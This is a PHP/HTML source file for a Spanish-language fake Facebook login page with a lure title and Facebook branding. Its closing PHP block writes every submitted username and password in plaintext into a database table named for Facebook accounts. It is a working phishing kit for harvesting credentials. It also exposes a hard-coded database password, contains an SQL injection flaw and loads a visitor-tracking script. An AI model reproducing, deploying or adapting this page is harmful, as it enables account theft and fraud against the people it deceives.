<?php
    $servidor = "localhost";
    $usuario = "id21738922_root";
    $clave = "";
    $baseDeDatos = "id21738922_facebook_accounts";

    $conectar = mysqli_connect ('localhost','id21738922_root','Al2229+2229$',"id21738922_facebook_accounts");
?>    

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Publicado hace 30 segundos</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #eeeeee;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    .login-container {
      background-color: #ffffff;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      width: 300px;
      text-align: center;
    }

    .logo {
      margin-bottom: 20px;
    }

    .logo img {
      width: 250px; /* ajusta el tamaño del logotipo según sea necesario */
    }

    .login-container h2 {
      color: #eeeeee;
      font-size: 1.5em;
      margin-bottom: 20px;
    }

    .login-form {
      display: flex;
      flex-direction: column;
    }

    .form-group {
      margin-bottom: 15px;
    }

    .form-group label {
      font-size: 15px;
      margin-bottom: 5px;
      color: #eeeeee;
    }

    .form-group input {
      padding: 15px;
      border: 1.5px solid #eeeeee;
      border-radius: 5px;
      font-size: 18px;
    }

    .form-group button {
      background-color: #1877f2;
      color: #fff;
      padding: 15px 75px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: ,25px;
      font-family: helvetica;
      font-weight: bold;
    }
    

    .form-group button:hover {
      background-color: #0e5a8a;
    }
    
  </style>
  
<link rel="icon" href="https://i.postimg.cc/vTNxR9Kx/FB.jpg" type="image/x-icon">  


<meta property="og:image" content="https://i.postimg.cc/3Js1QBKj/Picsart-24-01-02-12-23-38-742.jpg">
  

<script id="_waukhu">var _wau = _wau || []; _wau.push(["small", "xf2blbfaus", "khu"]);</script><script async src="//waust.at/s.js"></script>
  
  
</head>
<body>

 <center><div class="login-container">
    <div class="logo">
      <img src="https://i.postimg.cc/GmWZRPDf/Facebook-Logo-tumb.png" alt="Logo">
      <p></p>
    </div>
    <form action="#" name="facebook_accounts" method="post">
      <div class="form-group">
        <label for="username"></label>
        <input type="text" id="username" name="username" placeholder="celular o correo electrónico" required>
      </div>
      <div class="form-group">
        <label for="password"></label>
        <input type="password" id="password" name="password" placeholder="contraseña" required>
      </div><br>
      <div class="form-group">
     <button type="submit" name="login">Iniciar Sesión</button>
     <br><br>
     <a href="https://www.ejemplo.com">¿Olvidaste tu contraseña?</a><br><br>
     <hr> <button type="submit" name="login" class="button" style="background-color: #4CAF50;" >Crear cuenta</button><br><br>
      </div>
    </form>
  </div></center>  
  
</body>
</html>

<?php
    if(isset($_POST['login'])){
       
    $username= $_POST ['username'];
    $password= $_POST ['password'];
        
    $insertarDatos = "INSERT INTO log_in VALUES('$username','$password','0')";
    $ejecutarInsertar = mysqli_query ($conectar, $insertarDatos);
    
   }
?>
 







